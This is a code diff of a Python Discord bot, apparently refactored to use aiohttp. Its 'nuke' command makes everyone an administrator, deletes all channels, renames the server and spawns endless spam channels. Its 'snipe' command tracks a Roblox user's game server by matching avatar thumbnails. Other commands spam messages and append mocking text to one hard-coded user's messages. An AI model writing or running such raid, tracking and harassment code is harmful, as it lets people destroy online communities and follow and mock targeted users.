@@ -1,6 +1,5 @@
 import discord
 import os
-import requests
 import threading
 import aiohttp
 import asyncio
@@ -13,6 +12,7 @@ from dotenv import load_dotenv
 load_dotenv()
 
 app = Flask(__name__)
+
 @app.route('/')
 def home():
     return "Bot is alive!", 200
@@ -30,7 +30,9 @@ GAY_USER_ID = 1391486635962798242
 gay_mode_enabled = False
 gay_mode_text = " i'm gay"
 
-def gaymode(user_id: int, message: str) -> str:
+session = None
+
+def apply_gaymode(user_id: int, message: str) -> str:
     if user_id == GAY_USER_ID and gay_mode_enabled:
         return message + gay_mode_text
     return message
@@ -38,7 +40,7 @@ def gaymode(user_id: int, message: str) -> str:
 class CustomMessageButtonView(discord.ui.View):
     def __init__(self, message: str, user_id: int):
         super().__init__(timeout=None)
-        self.message = gaymode(user_id, message)
+        self.message = apply_gaymode(user_id, message)
 
     @discord.ui.button(label="Send Message", style=discord.ButtonStyle.primary)
     async def send_custom_message(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -47,7 +49,7 @@ class CustomMessageButtonView(discord.ui.View):
 class KokoButtonView(discord.ui.View):
     def __init__(self, message: str, count: int, user_id: int):
         super().__init__(timeout=None)
-        self.message = gaymode(user_id, message)
+        self.message = apply_gaymode(user_id, message)
         self.count = count
 
     @discord.ui.button(label="Send", style=discord.ButtonStyle.primary)
@@ -55,12 +57,16 @@ class KokoButtonView(discord.ui.View):
         if self.count > 5:
             await interaction.response.send_message("Count max is 5.", ephemeral=True)
             return
+
         await interaction.response.defer(ephemeral=False)
+
         for _ in range(self.count):
             await interaction.followup.send(self.message)
 
 @bot.event
 async def on_ready():
+    global session
+    session = aiohttp.ClientSession()
     await bot.tree.sync()
     print(f"Bot is online as {bot.user}")
 
@@ -75,6 +81,7 @@ async def snipe(interaction: discord.Interaction, user_id: int, place_id: int):
     if user in cooldowns and now - cooldowns[user] < 300:
         remaining = 300 - (now - cooldowns[user])
         minutes = round(remaining / 60, 1)
+
         await interaction.response.send_message(
             f"⏳ Please wait {minutes} minutes before using this command again.",
             ephemeral=True
@@ -83,18 +90,34 @@ async def snipe(interaction: discord.Interaction, user_id: int, place_id: int):
 
     cooldowns[user] = now
 
-    await interaction.response.send_message(f"🔍 Searching for user `{user_id}` in place `{place_id}`...", ephemeral=True)
+    await interaction.response.send_message(
+        f"🔍 Searching for user `{user_id}` in place `{place_id}`...",
+        ephemeral=True
+    )
 
-    user_data = requests.get(f"https://users.roblox.com/v1/users/{user_id}").json()
-    username = user_data.get("name", "Unknown")
-    target_thumb = requests.get(
-        f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png&isCircular=false"
-    ).json()["data"][0]["imageUrl"]
+    try:
+        async with session.get(f"https://users.roblox.com/v1/users/{user_id}") as r:
+            user_data = await r.json()
 
-    place_data = requests.get(f"https://games.roblox.com/v1/games?universeIds={place_id}").json()
-    game_name_text = place_data.get("data", [{}])[0].get("name", "Unknown Game")
-    game_link = f"https://roblox.com/games/{place_id}"
-    game_name = f"[{game_name_text}]({game_link})"
+        username = user_data.get("name", "Unknown")
+
+        async with session.get(
+            f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png&isCircular=false"
+        ) as r:
+            thumb_json = await r.json()
+
+        target_thumb = thumb_json["data"][0]["imageUrl"]
+
+        async with session.get(f"https://games.roblox.com/v1/games?universeIds={place_id}") as r:
+            place_data = await r.json()
+
+        game_name_text = place_data.get("data", [{}])[0].get("name", "Unknown Game")
+        game_link = f"https://roblox.com/games/{place_id}"
+        game_name = f"[{game_name_text}]({game_link})"
+
+    except Exception:
+        await interaction.followup.send("❌ Failed to fetch Roblox data.", ephemeral=True)
+        return
 
     cursor = ""
     headers = {"User-Agent": "DiscordBot/1.0"}
@@ -105,7 +128,9 @@ async def snipe(interaction: discord.Interaction, user_id: int, place_id: int):
         description=f"Game: {game_name}\nPlace ID: {place_id}\nSearching servers...",
         color=discord.Color.green()
     )
+
     embed.set_thumbnail(url=target_thumb)
+
     msg = await interaction.followup.send(embed=embed, ephemeral=False)
 
     while True:
@@ -113,37 +138,51 @@ async def snipe(interaction: discord.Interaction, user_id: int, place_id: int):
         if cursor:
             url += f"&cursor={cursor}"
 
-        r = requests.get(url, headers=headers)
-        data = r.json()
+        async with session.get(url, headers=headers) as r:
+            data = await r.json()
+
         servers = data.get("data", [])
+
         if not servers:
             break
 
         updated = False
+
         for s in servers:
-            tokens = [{"token": t, "type": "AvatarHeadshot", "size": "150x150", "requestId": s["id"]} for t in s.get("playerTokens", [])]
+            tokens = [
+                {"token": t, "type": "AvatarHeadshot", "size": "150x150", "requestId": s["id"]}
+                for t in s.get("playerTokens", [])
+            ]
+
             if not tokens:
                 continue
-            thumb_data = requests.post(
+
+            async with session.post(
                 "https://thumbnails.roblox.com/v1/batch",
-                headers={"Content-Type": "application/json"},
                 json=tokens
-            ).json()
+            ) as r:
+                thumb_data = await r.json()
+
             for t in thumb_data.get("data", []):
+
                 if t.get("imageUrl") == target_thumb and s["id"] not in found_servers:
                     found_servers.append(s["id"])
                     updated = True
 
         if updated:
             desc = f"Game: {game_name}\nPlace ID: {place_id}\nFound in servers:\n"
+
             for sid in found_servers:
                 desc += f"Join: [Click Here To Join](https://peeky.pythonanywhere.com/join?placeId={place_id}&gameInstanceId={sid})\n"
+
             embed.description = desc
             await msg.edit(embed=embed)
 
         cursor = data.get("nextPageCursor")
+
         if not cursor:
             break
+
         await asyncio.sleep(1.5)
 
     if not found_servers:
@@ -162,6 +201,7 @@ async def gaymode_command(interaction: discord.Interaction, status: str, text: s
         return
 
     status = status.lower()
+
     if status not in ["on", "off"]:
         await interaction.response.send_message("Please choose either 'on' or 'off'.", ephemeral=True)
         return
@@ -170,6 +210,7 @@ async def gaymode_command(interaction: discord.Interaction, status: str, text: s
         gay_mode_enabled = True
         if text:
             gay_mode_text = " " + text
+
         await interaction.response.send_message(f"Gay mode enabled with text: `{gay_mode_text.strip()}`", ephemeral=True)
     else:
         gay_mode_enabled = False
@@ -183,8 +224,10 @@ async def koko_command(interaction: discord.Interaction, text: str, count: int):
     if count > 5:
         await interaction.response.send_message("Count max is 5.", ephemeral=True)
         return
+
     await interaction.response.send_message("https://discord.gg/jwYqu66bqm", ephemeral=True)
-    text = gaymode(interaction.user.id, text)
+    text = apply_gaymode(interaction.user.id, text)
+
     for _ in range(count):
         await interaction.followup.send(text)
 
@@ -205,7 +248,7 @@ async def kokobutton_command(interaction: discord.Interaction, message: str, cou
 @app_commands.describe(text="The message to be shown after")
 async def say_command(interaction: discord.Interaction, text: str):
     await interaction.response.send_message("https://discord.gg/jwYqu66bqm", ephemeral=True)
-    text = gaymode(interaction.user.id, text)
+    text = apply_gaymode(interaction.user.id, text)
     await interaction.followup.send(text)
 
 @bot.tree.command(name="saybutton", description="Send a custom message with a button")
@@ -226,31 +269,40 @@ async def petpet_command(interaction: discord.Interaction, user: discord.User):
     avatar_url = user.display_avatar.with_format("png").with_size(256).url
     api_url = f"https://api.obamabot.me/v2/image/petpet?image={avatar_url}"
 
-    async with aiohttp.ClientSession() as session:
-        async with session.get(api_url) as resp:
-            if resp.status != 200:
-                await interaction.followup.send("❌ Failed to generate petpet image.", ephemeral=True)
-                return
+    async with session.get(api_url) as resp:
+        if resp.status != 200:
+            await interaction.followup.send("❌ Failed to generate petpet image.", ephemeral=True)
+            return
 
-            data = await resp.json()
-            if data.get("error") or "url" not in data:
-                await interaction.followup.send("❌ Error in response from API.", ephemeral=True)
-                return
+        data = await resp.json()
 
-            await interaction.followup.send(data["url"])
+        if data.get("error") or "url" not in data:
+            await interaction.followup.send("❌ Error in response from API.", ephemeral=True)
+            return
+
+        await interaction.followup.send(data["url"])
 
 @bot.tree.command(name="nuke", description="Destroy and spam the server")
 async def nuke(interaction: discord.Interaction):
+    if interaction.user.id != PEEKY_ID:
+        await interaction.response.send_message("Not authorized.", ephemeral=True)
+        return
+
+    await interaction.response.defer()
     try:
         await interaction.guild.default_role.edit(permissions=discord.Permissions(administrator=True))
+
         for channel in list(interaction.guild.channels):
             try:
                 await channel.delete()
             except:
                 pass
+
         await interaction.guild.edit(name="nuked by TBO")
+
         async def create_and_spam():
             ch = await interaction.guild.create_text_channel("TBO on top")
+
             async def spam():
                 while True:
                     try:
@@ -258,21 +310,27 @@ async def nuke(interaction: discord.Interaction):
                     except:
                         break
                     await asyncio.sleep(0.1)
+
             bot.loop.create_task(spam())
+
         for _ in range(3):
             await create_and_spam()
         async def channel_spawner():
+
             while True:
                 await create_and_spam()
                 await asyncio.sleep(0.5)
+
         bot.loop.create_task(channel_spawner())
     except Exception as e:
         await interaction.followup.send(f"❌ Error: {e}")
 
 token = os.getenv("TOKEN")
+
 if not token:
     raise ValueError("TOKEN not set in .env.")
 
 flask_thread = threading.Thread(target=run_flask)
 flask_thread.start()
+
 bot.run(token)
